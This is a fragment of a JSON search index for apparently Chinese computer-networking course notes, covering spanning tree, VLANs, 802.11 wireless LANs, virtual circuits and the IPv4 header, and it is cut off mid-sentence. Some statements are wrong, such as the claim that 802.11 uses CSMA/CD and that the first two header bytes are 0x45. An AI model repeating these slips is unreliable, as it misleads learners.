<p>\u539f\u5148\u4e3a\u4e86\u5b9e\u73b0\u53ef\u9760\u4f20\u8f93\uff0c\u6570\u636e\u94fe\u8def\u5c42\u66fe\u4f7f\u7528\u5197\u4f59\u73af\u72b6\u62d3\u6251\uff0c\u4f46\u8fd9\u79cd\u7269\u7406\u73af\u8def\u4f1a\u9020\u6210\u4ee5\u4e0b\u51e0\u79cd\u95ee\u9898\uff1a</p> \u5e7f\u64ad\u98ce\u66b4\u91cd\u590d\u5e27MAC \u5730\u5740\u8868\u4e0d\u7a33\u5b9a <p></p> <p></p> <p></p> <p>\u751f\u6210\u6811\u534f\u8bae Spanning Tree Protocol \u7684\u76ee\u7684\u662f\u7ef4\u62a4\u4e00\u4e2a\u65e0\u73af\u8def\u7684\u7f51\u7edc\uff0c\u5f53\u4ea4\u6362\u673a\u53d1\u73b0\u4e00\u4e2a\u62d3\u6251\u73af\u8def\u65f6\uff0c\u5b83\u4f1a\u81ea\u52a8\u5728\u903b\u8f91\u4e0a\u963b\u585e\u4e00\u4e2a\u6216\u591a\u4e2a\u5197\u4f59\u7aef\u53e3\uff0c\u4ece\u800c\u83b7\u5f97\u65e0\u73af\u8def\u62d3\u6251\u3002</p> <p>\u539f\u5148\u7269\u7406\u73af\u8def\u4e2d\u7684\u4ea4\u6362\u673a\u901a\u8fc7\u6536\u53d1\u6865\u534f\u8bae\u6570\u636e\u5355\u5143 BPDU\uff0c\u9009\u4e3e\u4ea7\u751f\u6839\u6865 Root Bridge\u3001\u6839\u7aef\u53e3 Root Port\u3001\u6307\u5b9a\u7aef\u53e3 Designated Port\uff0c\u5f62\u6210\u751f\u6210\u6811\uff1a</p> <ul> <li>&lt;1&gt; \u9009\u4e3e\u6839\u6865<ul> <li>\u540c\u4e00\u5e7f\u64ad\u57df\u4e2d\u7684\u6240\u6709\u4ea4\u6362\u673a\u90fd\u53c2\u4e0e\u9009\u4e3e</li> <li>\u6865 ID \u6700\u5c0f\u7684\u7f51\u6865\u6210\u4e3a\u751f\u6210\u6811\u7684\u6839\uff0c\u5176\u5b83\u7684\u5747\u4e3a\u975e\u6839\u6865<ul> <li>\u8fd9\u91cc\u6865 ID \u9996\u5148\u8003\u8651\u4f18\u5148\u7ea7\uff0c\u518d\u8003\u8651 MAC \u5730\u5740</li> </ul> </li> <li>\u6839\u6865\u7684\u6240\u6709\u7aef\u53e3\u90fd\u5904\u4e8e\u8f6c\u53d1\u72b6\u6001\uff0c\u53ef\u4ee5\u63a5\u6536\u548c\u53d1\u9001\u6570\u636e\u5e27</li> </ul> </li> <li>&lt;2&gt; \u9009\u4e3e\u6839\u7aef\u53e3<ul> <li>\u6bcf\u4e2a\u975e\u6839\u6865\u6bd4\u8f83\u5176\u6bcf\u4e2a\u7aef\u53e3\u5230\u6839\u6865\u7684\u8def\u5f84\u5f00\u9500\uff0c\u9009\u51fa\u6700\u5c0f\u5f00\u9500\u7684\u7aef\u53e3\u4e3a\u6839\u7aef\u53e3<ul> <li>\u5982\u679c\u591a\u4e2a\u7aef\u53e3\u5f00\u9500\u76f8\u540c\uff0c\u5219\u9009\u7aef\u53e3 ID \u6700\u5c0f\u7684\u7aef\u53e3</li> <li>\u6839\u8def\u5f84\u5f00\u9500\u4e3a\u5230\u6839\u6865\u4e0a\u6240\u6709\u7aef\u53e3\u5f00\u9500\u4e4b\u548c\uff0c\u5177\u4f53\u7684\u5f00\u9500\u503c\u53d7\u7aef\u53e3\u7684\u901f\u7387\u503c\u5f71\u54cd</li> </ul> </li> <li>\u975e\u6839\u6865\u53ea\u6709\u4e00\u4e2a\u6839\u7aef\u53e3\uff0c\u6839\u7aef\u53e3\u5904\u4e8e\u8f6c\u53d1\u72b6\u6001</li> </ul> </li> <li>&lt;3&gt; \u4e3a\u6bcf\u4e2a\u7f51\u6bb5\u786e\u5b9a\u4e00\u4e2a\u6307\u5b9a\u7aef\u53e3<ul> <li>\u5bf9\u4e8e\u6bcf\u4e2a\u7f51\u6bb5\uff0c\u5728\u6240\u6709\u8fde\u63a5\u5230\u5b83\u7684\u4ea4\u6362\u673a\u7aef\u53e3\u4e2d\u9009\u62e9\u4e00\u4e2a\u6700\u5c0f\u6839\u8def\u5f84\u5f00\u9500\u7684\u7aef\u53e3\u4f5c\u4e3a\u6307\u5b9a\u7aef\u53e3</li> <li>\u6307\u5b9a\u7aef\u53e3\u5904\u4e8e\u8f6c\u53d1\u72b6\u6001\uff0c\u8d1f\u8d23\u8be5\u7f51\u6bb5\u7684\u6570\u636e\u8f6c\u53d1</li> <li>\u8fde\u63a5\u8be5\u7f51\u6bb5\u7684\u5176\u5b83\u7aef\u53e3\uff0c\u5982\u679c\u65e2\u4e0d\u662f\u6307\u5b9a\u7aef\u53e3\uff0c\u4e5f\u4e0d\u662f\u6839\u7aef\u53e3\uff0c\u5219\u88ab\u963b\u585e</li> </ul> </li> </ul> <p></p> \u5224\u65ad\u9898\uff1a\u6839\u6865\u7684\u6240\u6709\u8fde\u63a5\u7aef\u53e3\u90fd\u662f\u6307\u5b9a\u7aef\u53e3 <p>\u2714\uff0c\u56e0\u4e3a\u6839\u6865\u8fde\u63a5\u7684\u6240\u6709\u7f51\u6bb5\u4e2d\uff0c\u90fd\u662f\u6839\u6865\u7684\u8fde\u63a5\u7aef\u53e3\u5177\u6709\u6700\u5c0f\u6839\u8def\u5f84\u5f00\u9500\uff08\u5373 0\uff09\u3002</p> <p>\u5f53\u7269\u7406\u62d3\u6251\u4e2d\u67d0\u4e2a\u4ea4\u6362\u673a\u6216\u8005\u67d0\u4e2a\u94fe\u8def\u6545\u969c\u65f6\uff0c\u6211\u4eec\u9700\u8981\u91cd\u65b0\u6784\u9020\u751f\u6210\u6811\u3002\u4e3a\u4e86\u52a0\u5feb\u91cd\u65b0\u6784\u5efa\u751f\u6210\u6811\u7684\u6b65\u9aa4\uff0c\u6211\u4eec\u6709\u4e86 STP \u7684\u4f18\u5316\u7248 Rapid Spanning Tree Protocol\u3002</p> <p></p>"},{"location":"Courses/CN/Topic2/#_13","title":"\u5c40\u57df\u7f51","text":"<p>\u5c40\u57df\u7f51 Local Area Network\uff0cLAN \u6307\u5728\u4e00\u4e2a\u8f83\u5c0f\u5730\u7406\u8303\u56f4\u5185\uff0c\u5c06\u5404\u79cd\u8ba1\u7b97\u673a\u3001\u5916\u90e8\u8bbe\u5907\u548c\u6570\u636e\u5e93\u7cfb\u7edf\u7b49\u901a\u8fc7\u53cc\u7ede\u7ebf\u3001\u540c\u8f74\u7535\u7f06\u7b49\u4ecb\u8d28\u4e92\u76f8\u8fde\u63a5\u8d77\u6765\uff0c\u7ec4\u6210\u8d44\u6e90\u548c\u4fe1\u606f\u5171\u4eab\u7684\u8ba1\u7b97\u673a\u4e92\u8054\u7f51\u7edc\u3002</p> <p>\u5c40\u57df\u7f51\u7684\u7279\u6027\u4e3b\u8981\u7531\u62d3\u6251\u7ed3\u6784\u3001\u4f20\u8f93\u4ecb\u8d28\u3001\u4ecb\u8d28\u8bbf\u95ee\u63a7\u5236\u65b9\u5f0f\u6765\u51b3\u5b9a\u3002</p>"},{"location":"Courses/CN/Topic2/#_14","title":"\u6709\u7ebf\u5c40\u57df\u7f51","text":"<p>\u4ee5\u592a\u7f51\u662f\u76ee\u524d\u6700\u6d41\u884c\u7684\u6709\u7ebf\u5c40\u57df\u7f51\u6280\u672f\uff0c\u5b83\u7684\u903b\u8f91\u62d3\u6251\u662f\u603b\u7ebf\u5f62\u7ed3\u6784\uff0c\u7269\u7406\u62d3\u6251\u662f\u661f\u5f62\u7ed3\u6784\u3002\u4ee5\u592a\u7f51\u91c7\u7528\u4e24\u9879\u63aa\u65bd\u6765\u7b80\u5316\u901a\u4fe1\uff1a</p> <ul> <li>&lt;1&gt; \u91c7\u7528\u65e0\u8fde\u63a5\u5de5\u4f5c\u65b9\u5f0f\uff0c\u65e2\u4e0d\u5bf9\u53d1\u9001\u7684\u6570\u636e\u5e27\u7f16\u53f7\uff0c\u53c8\u4e0d\u8981\u6c42\u63a5\u6536\u65b9\u53d1\u9001\u786e\u8ba4\uff0c\u5373\u4ee5\u592a\u7f51\u5c3d\u6700\u5927\u52aa\u529b\u4ea4\u4ed8\u6570\u636e\uff0c\u63d0\u4f9b\u7684\u662f\u4e0d\u53ef\u9760\u670d\u52a1<ul> <li>\u5bf9\u5dee\u9519\u7684\u7ea0\u6b63\u7531\u9ad8\u5c42\u5b8c\u6210</li> </ul> </li> <li>&lt;2&gt; \u53d1\u9001\u7684\u6570\u636e\u91c7\u7528\u66fc\u5f7b\u65af\u7279\u7f16\u7801\uff0c\u6bcf\u4e2a\u7801\u5143\u4e2d\u95f4\u51fa\u73b0\u4e00\u6b21\u7535\u538b\u8f6c\u6362\uff0c\u63a5\u6536\u65b9\u53ef\u4ee5\u65b9\u4fbf\u8fdb\u884c\u4f4d\u540c\u6b65</li> </ul> <p>Virtual LAN \u53ef\u5c06\u4e00\u4e2a\u8f83\u5927\u7684\u5c40\u57df\u7f51\u5206\u5272\u6210\u4e00\u4e9b\u8f83\u5c0f\u7684\uff0c\u4e0e\u5730\u7406\u4f4d\u7f6e\u65e0\u5173\u7684\u903b\u8f91 VLAN\u3002\u5c5e\u4e8e\u540c\u4e00\u4e2a VLAN \u7684\u8ba1\u7b97\u673a\u4e4b\u95f4\u53ef\u4ee5\u76f4\u63a5\u901a\u4fe1\uff0c\u800c\u4e0d\u540c VLAN \u7684\u8ba1\u7b97\u673a\u4e4b\u95f4\u4e0d\u80fd\u76f4\u63a5\u4e8c\u5c42\u901a\u4fe1\u3002</p> <p>\u201c\u4e8c\u5c42\u201d\u6307\u7684\u662f\u6570\u636e\u94fe\u8def\u5c42</p> <p>\u4e00\u4e2a\u4ee5\u592a\u7f51\u662f\u4e00\u4e2a\u5e7f\u64ad\u57df\uff0c\u901a\u8fc7 VLAN\uff0c\u5c06\u4e00\u4e2a\u8f83\u5927\u5c40\u57df\u7f51\u5206\u5272\u6210\u4e00\u4e9b\u8f83\u5c0f\u7684\u5e7f\u64ad\u57df</p> \u57fa\u4e8e\u7aef\u53e3\u7684 VLAN\u57fa\u4e8e MAC \u5730\u5740\u7684 VLAN\u57fa\u4e8e\u534f\u8bae\u7684 VLAN\u57fa\u4e8e\u5b50\u7f51\u7684 VLAN <p>\u662f\u6700\u7b80\u5355\u3001\u6700\u6709\u6548\u7684 VLAN \u5212\u5206\u65b9\u6cd5\uff0c\u5b83\u6309\u7167\u8bbe\u5907\u7aef\u53e3\u6765\u5b9a\u4e49 VLAN \u6210\u5458\uff0c\u5c06\u6307\u5b9a\u7aef\u53e3\u52a0\u5165\u5230\u6307\u5b9a VLAN \u4e2d\u3002\u8be5\u7aef\u53e3\u53ef\u4ee5\u8f6c\u53d1\u6307\u5b9a VLAN \u7684\u6570\u636e\u5e27\uff1a</p> <p></p> <p>\u57fa\u4e8e MAC \u5730\u5740\u7684 VLAN \u4e2d\uff0c\u5f53\u7528\u6237\u7269\u7406\u4f4d\u7f6e\u79fb\u52a8\u65f6\uff08\u4ece\u539f\u7aef\u53e3\u79fb\u52a8\u5230\u53e6\u4e00\u4e2a\u7aef\u53e3\uff09\uff0c\u4e0d\u9700\u8981\u91cd\u65b0\u914d\u7f6e VLAN Table\uff1a</p> <p></p> <p>\u6839\u636e\u7aef\u53e3\u63a5\u6536\u5230\u7684\u6570\u636e\u5305\u6240\u5c5e\u7684\u534f\u8bae\u7c7b\u578b\u6765\u7ed9\u6570\u636e\u62a5\u5206\u914d\u4e0d\u540c\u7684 VLAN ID\uff1a</p> <p></p> <p>\u6839\u636e\u6570\u636e\u5305\u6e90IP\u5730\u5740\u53ca\u5b50\u7f51\u63a9\u7801\u4f5c\u4e3a\u4f9d\u636e\u6765\u8fdb\u884c\u5212\u5206\u7684\uff0c\u8bbe\u5907\u4ece\u7aef\u53e3\u63a5\u6536\u5230\u6570\u636e\u5305\u540e\uff0c\u6839\u636e\u6e90IP\u5730\u5740\uff0c\u627e\u5230\u4e0e\u73b0\u6709VLAN\u7684\u5bf9\u5e94\u5173\u7cfb\uff1a</p> <p></p> <p>Trunk \u7aef\u53e3\u7528\u4e8e\u4ea4\u6362\u673a\u4e4b\u95f4\u7684\u8fde\u63a5\uff0c\u5141\u8bb8\u591a\u4e2a VLAN \u901a\u8fc7\uff0c\u4ece\u800c\u5b9e\u73b0\u8de8\u4ea4\u6362\u673a\u7684 VLAN \u5b9e\u73b0\uff1a</p> <p></p>"},{"location":"Courses/CN/Topic2/#_15","title":"\u65e0\u7ebf\u5c40\u57df\u7f51","text":"<p>\u65e0\u7ebf\u5c40\u57df\u7f51\u6307\u4ee5\u65e0\u7ebf\u4fe1\u9053\u4f5c\u4e3a\u4f20\u8f93\u4ecb\u8d28\u7684\u8ba1\u7b97\u673a\u5c40\u57df\u7f51\uff0c\u53ef\u5206\u4e3a\u6709\u56fa\u5b9a\u57fa\u7840\u8bbe\u65bd\u7684\u65e0\u7ebf\u5c40\u57df\u7f51\u548c\u65e0\u56fa\u5b9a\u57fa\u7840\u8bbe\u65bd\u7684\u79fb\u52a8\u81ea\u7ec4\u7ec7\u7f51\u7edc\u3002</p> <p>\u65e0\u56fa\u5b9a\u57fa\u7840\u8bbe\u65bd\u7684\u65e0\u7ebf\u5c40\u57df\u7f51\u79f0\u4e3a\u81ea\u7ec4\u7f51\u7edc(ad hoc network)\uff0c\u662f\u7531\u4e00\u4e9b\u5e73\u7b49\u72b6\u6001\u7684\u79fb\u52a8\u7ad9\u76f8\u4e92\u901a\u4fe1\u7ec4\u6210\u7684\u4e34\u65f6\u7f51\u7edc\uff0c\u5404\u8282\u70b9\u90fd\u5177\u6709\u8def\u7531\u5668\u8f6c\u53d1\u529f\u80fd\u3002</p> <p>\u800c\u5bf9\u4e8e\u6709\u56fa\u5b9a\u57fa\u7840\u8bbe\u65bd\u7684\u65e0\u7ebf\u5c40\u57df\u7f51\uff0cIEEE \u6307\u5b9a\u4e86 802.11 \u7cfb\u5217\u534f\u8bae\u6807\u51c6\uff0c\u5305\u62ec 802.11a/b/h/n \u7b49\u3002802.11 \u6807\u51c6\u4f7f\u7528\u661f\u5f62\u62d3\u6251\uff0c\u5176\u4e2d\u5fc3\u4e3a\u63a5\u5165\u70b9(Access Point, AP)\uff0c\u5728 MAC \u5b50\u5c42\u4f7f\u7528 CSMA/CD \u534f\u8bae\u3002</p> <p>\u4f7f\u7528 802.11 \u7cfb\u5217\u534f\u8bae\u7684\u5c40\u57df\u7f51\u4e5f\u53eb\u505a Wi-Fi</p> <p>\u4e00\u4e2a\u57fa\u672c\u670d\u52a1\u96c6(Basic Service Set, BSS)\u5305\u62ec\u4e00\u4e2a AP \u548c\u82e5\u5e72\u79fb\u52a8\u7ad9\uff0c\u662f\u6784\u6210\u65e0\u7ebf\u5c40\u57df\u7f51\u7684\u6700\u5c0f\u6784\u4ef6\u3002\u5404\u7ad9\u5728\u672c BSS \u5185\u901a\u4fe1\u6216\u4e0e\u5916\u90e8\u7ad9\u901a\u4fe1\uff0c\u90fd\u5fc5\u987b\u901a\u8fc7\u672c BSS \u7684 AP\u3002</p> <p>BSS \u53ef\u4ee5\u901a\u8fc7 AP \u8fde\u63a5\u5230 Distribution System, DS \u4e0a\uff0c\u7136\u540e\u518d\u8fde\u63a5\u5230\u53e6\u4e00\u4e2a\u57fa\u672c\u670d\u52a1\u96c6\uff0c\u6784\u6210\u4e00\u4e2a\u62d3\u5c55\u7684\u670d\u52a1\u96c6\uff08Extended Service Set, ESS\uff09\u3002</p> <p></p> <p>\u7531\u4e8e\u65e0\u7ebf\u4fe1\u9053\u7684\u9ad8\u8bef\u7801\u7387\u3001\u5171\u4eab\u6027\uff0cIEEE 802.11 \u91c7\u7528\u505c\u7b49\u534f\u8bae\u9010\u5e27\u786e\u8ba4\uff0c\u800c\u4e0d\u91c7\u7528\u6ed1\u52a8\u7a97\u53e3\u534f\u8bae\u3002</p> <p>802.11 \u6709\u6570\u636e\u5e27\u3001\u63a7\u5236\u5e27\u548c\u7ba1\u7406\u5e27\u4e09\u79cd\uff0c\u7531 MAC \u9996\u90e8\u3001\u5e27\u4e3b\u4f53\u548c\u5e27\u68c0\u9a8c\u5e8f\u5217 FCS \u7ec4\u6210\uff1a</p> <p></p> <p>802.11 \u5e27\u4e2d\u9996\u90e8\u5171\u6709\u56db\u4e2a\u5730\u5740\u5b57\u6bb5\uff0c</p> <p></p>"},{"location":"Courses/CN/Topic3/","title":"\u7f51\u7edc\u5c42","text":""},{"location":"Courses/CN/Topic3/#_1","title":"\u7f51\u7edc\u5c42","text":"<p> \u7ea6 5719 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 29 \u5206\u949f</p>"},{"location":"Courses/CN/Topic3/#concept","title":"Concept","text":""},{"location":"Courses/CN/Topic3/#_2","title":"\u5f02\u6784\u7f51\u7edc\u4e92\u8fde","text":"<p>\u7f51\u7edc\u4e92\u8fde\u6307\u5c06\u4e24\u4e2a\u4ee5\u4e0a\u7684\u8ba1\u7b97\u673a\u7f51\u7edc\u901a\u8fc7\u4e00\u5b9a\u7684\u65b9\u6cd5\uff0c\u7528\u4e2d\u7ee7\u7cfb\u7edf\u76f8\u4e92\u8fde\u63a5\u8d77\u6765\uff0c\u4ee5\u6784\u6210\u66f4\u5927\u7684\u7f51\u7edc\u7cfb\u7edf\u3002\u6839\u636e\u6240\u5728\u5c42\u6b21\uff0c\u4e2d\u7ee7\u7cfb\u7edf\u53ef\u5206\u4e3a\u4ee5\u4e0b\u56db\u79cd\uff1a</p> \u4e2d\u7ee7\u8bbe\u5907 \u7269\u7406\u5c42 \u8f6c\u53d1\u5668\u3001\u96c6\u7ebf\u5668 \u6570\u636e\u94fe\u8def\u5c42 \u7f51\u6865\uff08\u4ea4\u6362\u673a\uff09 \u7f51\u7edc\u5c42 \u8def\u7531\u5668 \u7f51\u7edc\u5c42\u4ee5\u4e0a \u7f51\u5173 <p>\u5bf9\u4e8e\u7269\u7406\u5c42\u548c\u6570\u636e\u94fe\u8def\u5c42\u7684\u4e2d\u7ee7\uff0c\u4ece\u7f51\u7edc\u5c42\u7684\u89d2\u5ea6\u6765\u770b\u53ea\u662f\u628a\u4e00\u4e2a\u7f51\u7edc\u6269\u5927\u4e86\uff0c\u4ed6\u4eec\u4ecd\u7136\u662f\u540c\u4e00\u4e2a\u7f51\u7edc\uff0c\u56e0\u6b64\u4e00\u822c\u4e0d\u79f0\u4e3a\u7f51\u7edc\u4e92\u8fde\u3002\u6211\u4eec\u4e00\u822c\u79f0\u7f51\u7edc\u4e92\u8fde\u4e3a\u901a\u8fc7\u8def\u7531\u5668\u8fdb\u884c\u7f51\u7edc\u8fde\u63a5\u548c\u8def\u7531\u9009\u62e9\u3002</p> <p>\u8def\u7531\u9009\u62e9\u548c\u5206\u7ec4\u8f6c\u53d1\u662f\u8def\u7531\u5668\u7684\u4e3b\u8981\u529f\u80fd\uff1a</p> <ul> <li>\u8def\u7531\u9009\u62e9 \u6839\u636e\u8def\u7531\u534f\u8bae\u6784\u9020\u8def\u7531\u8868\uff0c\u540c\u65f6\u7ecf\u5e38\u6216\u5b9a\u671f\u5730\u4e0e\u76f8\u90bb\u8def\u7531\u5668\u4ea4\u6362\u4fe1\u606f\uff0c\u83b7\u53d6\u7f51\u7edc\u6700\u65b0\u62d3\u6251\uff0c\u52a8\u6001\u66f4\u65b0\u7ef4\u62a4\u8def\u7531\u8868\uff0c\u4ee5\u51b3\u5b9a\u5206\u7ec4\u5230\u8fbe\u76ee\u7684\u5730\u8282\u70b9\u7684\u6700\u4f18\u8def\u5f84</li> <li>\u5206\u7ec4\u8f6c\u53d1 \u6839\u636e\u8f6c\u53d1\u8868\u5c06\u5206\u7ec4\u4ece\u5408\u9002\u7684\u7aef\u53e3\u8f6c\u53d1\u51fa\u53bb</li> </ul> <p>\u8def\u7531\u8868\u662f\u6839\u636e\u8def\u7531\u9009\u62e9\u7b97\u6cd5\u5f97\u5230\u7684\uff0c\u800c\u8f6c\u53d1\u8868\u662f\u6839\u636e\u8def\u7531\u8868\u5f97\u51fa\u7684\uff1b\u8ba8\u8bba\u8def\u7531\u9009\u62e9\u65f6\uff0c\u5f80\u5f80\u4e0d\u533a\u5206\u4e8c\u8005</p>"},{"location":"Courses/CN/Topic3/#_3","title":"\u7f51\u7edc\u5c42\u670d\u52a1","text":"<p>\u7f51\u7edc\u5c42\u670d\u52a1\u53ef\u5206\u4e3a\u9762\u5411\u8fde\u63a5\u7684\u865a\u7535\u8def\u670d\u52a1\u548c\u65e0\u8fde\u63a5\u7684\u6570\u636e\u62a5\u670d\u52a1\u3002</p> <p>\u865a\u7535\u8def</p> <p>\u5f53\u4e24\u53f0\u8ba1\u7b97\u673a\u901a\u4fe1\u65f6\uff0c\u5148\u5efa\u7acb\u4e00\u6761\u5728\u7f51\u7edc\u5c42\u4e0a\u903b\u8f91\u7684\u865a\u7535\u8def\u3002\u8fde\u63a5\u4e00\u65e6\u5efa\u7acb\uff0c\u5c31\u56fa\u5b9a\u4e86\u865a\u7535\u8def\u5bf9\u5e94\u7684\u7269\u7406\u8def\u5f84\u3002</p> <p>\u4e0e\u7535\u8def\u4ea4\u6362\u7c7b\u4f3c\uff0c\u865a\u7535\u8def\u7684\u901a\u4fe1\u8fc7\u7a0b\u4e5f\u5206\u4e3a \u865a\u7535\u8def\u5efa\u7acb\u3001\u6570\u636e\u4f20\u8f93\u3001\u865a\u7535\u8def\u91ca\u653e \u4e09\u4e2a\u9636\u6bb5</p> <p>\u6bcf\u6761\u865a\u7535\u8def\u5177\u6709\u4e00\u4e2a VCID\uff0c\u901a\u4fe1\u53cc\u65b9\u4ec5\u5728\u8fde\u63a5\u5efa\u7acb\u65f6\u4f7f\u7528\u5b8c\u6574\u7684\u76ee\u7684\u5730\u5740\u4f5c\u4e3a\u5206\u7ec4\u9996\u90e8\uff0c\u4e4b\u540e\u6bcf\u4e2a\u5206\u7ec4\u7684\u9996\u90e8\u53ea\u9700\u8981\u643a\u5e26\u8fd9\u6761\u865a\u7535\u8def\u7684 VCID \u5373\u53ef\u3002\u865a\u7535\u8def\u4e0a\u6bcf\u4e00\u4e2a\u8282\u70b9\u90fd\u7ef4\u62a4\u4e00\u4e2a\u865a\u7535\u8def\u8868\uff0c\u8868\u4e2d\u6bcf\u9879\u8bb0\u5f55\u4e00\u4e2a\u6253\u5f00\u7684\u865a\u7535\u8def\u4fe1\u606f\uff0c\u5305\u62ec\u5728\u63a5\u53d7\u94fe\u8def\u548c\u53d1\u9001\u94fe\u8def\u4e0a\u7684 VCID\u3001\u524d\u4e00\u8282\u70b9\u548c\u540e\u4e00\u8282\u70b9\u7684\u6807\u8bc6\u7b49\uff0c\u5b83\u662f\u5728\u865a\u7535\u8def\u5efa\u7acb\u8fc7\u7a0b\u4e2d\u786e\u5b9a\u7684\u3002</p> <p>\u6570\u636e\u62a5</p> <p>\u7f51\u7edc\u5728\u53d1\u9001\u5206\u7ec4\u524d\u65e0\u9700\u5148\u5efa\u7acb\u8fde\u63a5\uff0c\u7f51\u7edc\u4e0d\u63d0\u4f9b\u7aef\u5230\u7aef\u7684\u53ef\u9760\u4f20\u8f93\u670d\u52a1\u3002</p>"},{"location":"Courses/CN/Topic3/#ipv4","title":"IPv4","text":""},{"location":"Courses/CN/Topic3/#_4","title":"\u5206\u7ec4\u683c\u5f0f","text":"<p>Internet Protocol \u5b9a\u4e49\u4e86\u6570\u636e\u4f20\u9001\u7684\u57fa\u672c\u5355\u5143\u2014\u2014IP \u5206\u7ec4\u53ca\u5176\u786e\u5207\u7684\u6570\u636e\u683c\u5f0f\u3002IP \u5206\u7ec4\u7684\u9996\u90e8\u5206\u4e3a\u524d\u534a 20B \u56fa\u5b9a\u5927\u5c0f\u7684\u5fc5\u8981\u90e8\u5206\u4ee5\u53ca\u540e\u534a\u53ef\u53d8\u5927\u5c0f\u7684\u53ef\u9009\u5b57\u6bb5\uff0c\u7528\u6765\u63d0\u4f9b\u9519\u8bef\u68c0\u6d4b\u53ca\u5b89\u5168\u7b49\u673a\u5236\uff1a</p> <p></p> <ul> <li>\u7248\u672c: \u5171 4 bit\uff0c\u5728 IPv4 \u6570\u636e\u62a5\u4e2d\u4e3a 4</li> <li>\u9996\u90e8\u957f\u5ea6: \u5171 4 bit\uff0c\u4ee5 4B \u4e3a\u5355\u4f4d<ul> <li>\u6700\u5927\u53ef\u8868\u793a\u9996\u90e8\u957f\u5ea6\u4e3a 60B\uff0c\u5373\u8be5\u5b57\u6bb5\u503c\u4e3a 15</li> <li>\u6700\u5e38\u7528\u9996\u90e8\u957f\u5ea6\u4e3a 20B\uff0c\u5373\u8be5\u5b57\u6bb5\u503c\u4e3a 5</li> <li>IP \u9996\u90e8\u524d\u4e24\u4e2a\u5b57\u8282\u901a\u5e38\u4e3a 0x45</li> </ul> </li> <li>\u603b\u957f\u5ea6: \u5171 16 bit\uff0c\u6307\u9996\u90e8\u548c\u6570\u636e\u957f\u5ea6\u4e4b\u548c\uff0c\u4ee5 B \u4e3a\u5355\u4f4d<ul> <li>\u6700\u5927\u53ef\u8868\u793a\u6570\u636e\u62a5\u957f\u5ea6\u4e3a \\(2^{16}-1=65535B\\)</li> <li>\u4f46\u662f\u6570\u636e\u94fe\u8def\u5c42\u4e2d\u6700\u5927\u4f20\u9001\u5355\u5143\uff08MTU\uff09\u5927\u5c0f\u4e3a 1500B \u6216\u66f4\u5c0f\uff0c\u56e0\u6b64 IP \u6570\u636e\u62a5\u5c01\u88c5\u6210\u5e27\u65f6\u603b\u957f\u5ea6\u4e0d\u80fd\u8d85\u8fc7\u8be5\u503c</li> </ul> </li> <li>\u6807\u8bc6: \u5171 16 bit\uff0c\u8ba1\u6570\u5668\uff0c\u6bcf\u4ea7\u751f\u4e00\u4e2a\u6570\u636e\u62a5\u5c31\u52a0\u4e00<ul> <li>\u4e00\u4e2a\u6570\u636e\u62a5\u5c01\u88c5\u6210\u5e27\u88ab\u5206\u7247\u65f6\uff0c\u4ed6\u4eec\u7684\u6807\u8bc6\u53f7\u662f\u76f8\u540c\u7684\uff0c\u7528\u6765\u6b63\u786e\u91cd\u88c5\u6210\u539f\u6765\u7684\u6570\u636e\u62a5</li> </ul> </li> <li>\u6807\u5fd7: \u5171 3 bit\uff0c\u76ee\u524d\u53ea\u6709\u4e24\u4f4d\u6709\u610f\u4e49<ul> <li>\u6700\u4f4e\u4f4d MF = 1 \u8868\u793a\u540e\u9762\u8fd8\u6709\u5206\u7247\uff1bMF = 0 \u8868\u793a\u662f\u6700\u540e\u4e00\u4e2a\u5206\u7247</li> <li>\u4e2d\u95f4\u4f4d DF = 1 \u65f6\u8868\u793a\u4e0d\u5141\u8bb8\u5206\u7247\uff1bDF = 0 \u8868\u793a\u5141\u8bb8\u5206\u7247</li> </ul> </li> <li>\u7247\u504f\u79fb: \u5171 13 bit\uff0c\u8868\u793a\u6570\u636e\u62a5\u5206\u7247\u540e\u8be5\u7247\u5728\u539f\u6570\u636e\u62a5\u4e2d\u7684\u76f8\u5bf9\u504f\u79fb\uff0c\u4ee5 8B \u4e3a\u5355\u4f4d<ul> <li>\u8fd9\u4e5f\u610f\u5473\u7740\uff0c\u9664\u4e86\u6700\u540e\u4e00\u4e2a\u5206\u7247\uff0c\u6240\u6709\u5206\u7247\u7684\u6570\u636e\u90e8\u5206\u957f\u5ea6\u90fd\u662f 8B \u7684\u6574\u6570\u500d</li> </ul> </li> <li>\u751f\u5b58\u65f6\u95f4 TTL: \u5171 8 bit\uff0c\u6570\u636e\u62a5\u5728\u7f51\u7edc\u4e2d\u53ef\u901a\u8fc7\u7684\u8def\u7531\u5668\u6570\u91cf\u6700\u5927\u503c<ul> <li>\u8def\u7531\u5668\u5728\u8f6c\u53d1\u6570\u636e\u62a5\u4e4b\u524d\uff0c\u4f1a\u5bf9 TTL \u8fdb\u884c\u51cf\u4e00</li> <li>\u5982\u679c TTL \u51cf\u4e3a 0\uff0c\u5219\u4e22\u5f03</li> </ul> </li> <li>\u534f\u8bae: \u5171 8 bit\uff0cTCP \u4e3a 6\uff1bUDP \u4e3a 17</li> <li>\u9996\u90e8\u68c0\u9a8c\u548c: \u5171 16 bit\uff0c\u53ea\u68c0\u9a8c\u9996\u90e8<ul> <li>\u7ecf\u8fc7\u8def\u7531\u5668\u65f6\u6570\u636e\u62a5\u9996\u90e8\u4f1a\u6539\u53d8\uff0c\u56e0\u6b64\u6bcf\u6b21\u90fd\u8981\u91cd\u65b0\u8ba1\u7b97\u9996\u90e8\u68c0\u9a8c\u548c</li> </ul> </li> <li>\u6e90\u5730\u5740\u3001\u76ee\u7684\u5730\u5740: \u5171 32 bit\uff0c\u6807\u8bc6\u53d1\u9001\u65b9\u548c\u63a5\u6536\u65b9\u7684 IP \u5730\u5740</li> </ul>"},{"location":"Courses/CN/Topic3/#_5","title":"\u6570\u636e\u62a5\u5206\u7247","text":"<p>IP \u6570\u636e\u62a5\u8f6c\u53d1\u8def\u5f84\u4e0a\u7684\u5404\u6bb5\u94fe\u8def\u53ef\u80fd\u4f7f\u7528\u4e0d\u540c\u7684\u94fe\u8def\u5c42\u534f\u8bae\uff0c\u56e0\u6b64\u6709\u4e0d\u540c\u7684 MTU\u3002\u4f8b\u5982\uff0c\u4ee5\u592a\u7f51\u7684 MTU \u4e3a 1500B\uff0c\u800c\u8bb8\u591a\u5e7f\u57df\u7f51\u7684 MTU \u4e0d\u8d85\u8fc7 576B\u3002\u5f53 IP \u6570\u636e\u62a5\u603b\u957f\u5ea6\u5927\u4e8e MTU \u65f6\uff0c\u5c31\u9700\u8981\u5c06 IP 